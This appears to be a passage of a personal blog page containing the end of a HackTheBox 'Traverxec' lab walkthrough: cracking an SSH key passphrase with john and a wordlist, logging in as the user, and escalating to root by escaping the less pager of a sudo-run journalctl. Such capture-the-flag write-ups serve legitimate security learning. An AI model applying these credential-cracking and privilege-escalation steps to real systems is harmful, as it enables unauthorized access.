67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
+⚡ root@parrot HackTheBox-Machines/Traverxec   master  john --wordlist=/usr/share/wordlists/rockyou.txt DavidsKeyHash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter           (id_rsa)
+</code></pre><p>Now we log in with David’s SSH Key with the passphrase hunter.</p><pre><code class="language-bash">┌─[root@parrot]─[/home/user/Desktop/htb/HackTheBox-Machines/Traverxec]
+└──╼ #ssh -i ./home/david/.ssh/id_rsa david@traverxec.htb
+Enter passphrase for key './home/david/.ssh/id_rsa': 
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+Last login: Tue Dec 10 03:48:27 2019 from 10.10.15.152
+david@traverxec:~$ whoami
+david
+david@traverxec:~$ 
+</code></pre><p>we got David user.</p><h2 id="getting-root">Getting Root</h2><p>The first thing I noticed when I got the user when doing privilege escalation is there is a bin directory inside David’s home directory it has a file called <strong>server-stats.sh</strong>.  looking more deeply to understand the script. I saw that /usr/bin/<strong>journalctl </strong>is being run as root. so i went to GTFO bin’s  <a href="//gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a>  found this Simply ran that command as is given in the script and exploited the less prompt that open’s up as sudo using this<strong> !/bin/bash</strong>.</p><p>There is a catch though turn your terminal size to small or it wont work as the pager will only open up if your terminal size is smaller than the file.</p><pre><code class="language-bash">
+david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Tue 2019-12-10 04:15:08 EST, end at Tue 2019-12-10 04:42:14 EST. -
+Dec 10 04:34:17 traverxec crontab[3113]: (www-data) LIST (www-data)
+!/bin/bash
+root@traverxec:/home/david/bin# whoami
+root
+root@traverxec:/home/david/bin#</code></pre><h2 id="that-was-traverxec-writeup">That was Traverxec writeup</h2><p>Boom we are root so that was Traverxec Writeup. if this helped you let me know in comments. Need help comment down below.  Here is my profile if you like you can respect my profile thanks 🙂 <a href="//www.hackthebox.eu/home/users/profile/157669">https://www.hackthebox.eu/home/users/profile/157669</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
